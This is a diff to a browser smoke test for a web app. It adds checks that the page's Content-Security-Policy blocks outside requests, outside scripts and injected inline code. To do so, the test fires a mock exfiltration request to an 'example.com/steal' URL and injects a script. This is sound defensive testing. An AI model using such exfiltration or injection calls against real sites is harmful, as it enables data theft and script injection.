@@ -19,7 +19,9 @@ const server = http.createServer(async (req, res) => {
   catch { res.writeHead(404); res.end(); }
 });
 await new Promise(r => server.listen(0, '127.0.0.1', r));
-const url = `http://127.0.0.1:${server.address().port}/app/`;
+// SMOKE_URL=https://….netlify.app/ tests a deployed build instead; SMOKE_ONLY=csp runs only the security-policy checks
+const url = process.env.SMOKE_URL || `http://127.0.0.1:${server.address().port}/app/`;
+const ONLY_CSP = process.env.SMOKE_ONLY === 'csp';
 
 const R = []; let fails = 0;
 const ok = (n, c, x = '') => { const l = (c ? 'PASS ' : 'FAIL ') + n + (x ? ' — ' + String(x).slice(0, 200) : ''); R.push(l); console.log(l); if (!c) fails++; };
@@ -40,6 +42,31 @@ for (const dev of BR.device ? [BR.device] : ['iPhone SE', 'iPhone 16 Plus']) {
   const csp = await p.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
   ok(tag + 'Strict security policy: no inline code allowed, no outside site', !csp.includes('unsafe-inline') && csp.includes("script-src 'self'") && csp.includes("connect-src 'self'"), csp);
   ok(tag + 'Fits the screen (no sideways scroll)', await fits());
+
+  // the policy is really enforced by the browser: outside requests, injected inline code and outside scripts are blocked
+  const allowed = (/connect-src ([^;]*)/.exec(csp)?.[1] || '').split(' ').find(x => /^https:\/\/[a-z0-9-]+\.supabase\.co$/.test(x)) || null;
+  const errsBefore = errs.length; // the blocked requests below are on purpose: their console messages are not app errors
+  const v = await p.evaluate(async backend => {
+    window.__cspTest = true; window.__ran = false; const seen = [];
+    const h = e => seen.push((e.effectiveDirective || e.violatedDirective) + ' ' + e.blockedURI);
+    document.addEventListener('securitypolicyviolation', h);
+    let outside = 'sent'; try { await fetch('https://example.com/steal?d=1', { mode: 'no-cors' }); } catch { outside = 'blocked'; }
+    const img = new Image(); img.src = 'https://example.com/pixel.gif';
+    const s1 = document.createElement('script'); s1.textContent = 'window.__ran = true'; document.body.appendChild(s1);
+    const s2 = document.createElement('script'); s2.src = 'https://example.com/x.js'; document.body.appendChild(s2);
+    let toBackend = null;
+    if (backend) { try { await fetch(backend + '/rest/v1/', { mode: 'no-cors' }); } catch { /* network may fail: only the policy matters */ } toBackend = !seen.some(x => x.includes(backend)); }
+    const has = d => seen.some(x => x.startsWith(d));
+    for (let k = 0; k < 120 && !(has('connect-src') && has('img-src') && has('script-src')); k++) await new Promise(r => requestAnimationFrame(r));
+    for (let k = 0; k < 5; k++) await new Promise(r => requestAnimationFrame(r));
+    document.removeEventListener('securitypolicyviolation', h); window.__cspTest = false;
+    return { outside, ran: window.__ran, seen: [...new Set(seen.map(x => x.split(' ')[0]))].sort(), toBackend };
+  }, allowed);
+  await p.waitForTimeout(300); errs.splice(errsBefore);
+  ok(tag + 'Policy enforced: request, image and script from another site blocked, injected inline code not run',
+    v.outside === 'blocked' && !v.ran && ['connect-src', 'img-src', 'script-src'].every(d => v.seen.some(x => x.startsWith(d))), JSON.stringify(v));
+  if (allowed) ok(tag + 'Policy lets the app reach its own Supabase project (' + allowed + ')', v.toBackend === true, JSON.stringify(v));
+  if (ONLY_CSP) { ok(tag + 'No errors', !errs.length && await p.evaluate(() => window.__nd.length === 0), errs.join(' | ')); await ctx.close(); continue; }
 
   // training: read-only bridge to DUOFIT
   await p.click('nav a[href="#/training"]');await p.waitForSelector('h1:has-text("Entraînement")');
